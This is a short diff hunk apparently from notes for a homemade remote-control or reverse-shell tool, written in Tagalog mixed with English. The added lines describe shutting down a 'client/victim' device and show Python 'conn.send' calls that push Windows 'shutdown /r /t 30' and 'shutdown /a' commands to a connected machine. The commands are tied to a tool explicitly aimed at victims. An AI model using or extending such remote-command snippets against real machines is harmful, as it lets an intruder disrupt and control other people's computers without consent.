@@ -157,3 +157,19 @@ if __name__ == "__main__":
 Kapag ganiyan yung error, check yung IP. Baka mali/mismatch lang
 
 
+---
+Kapag gusto ko i-shutdown device ni client/victim:
+
+```bash
+# Restart instead of shutdown
+conn.send(b"shutdown /r /t 30")
+
+# Abort shutdown
+conn.send(b"shutdown /a")
+```
+
+
+
+
+
+
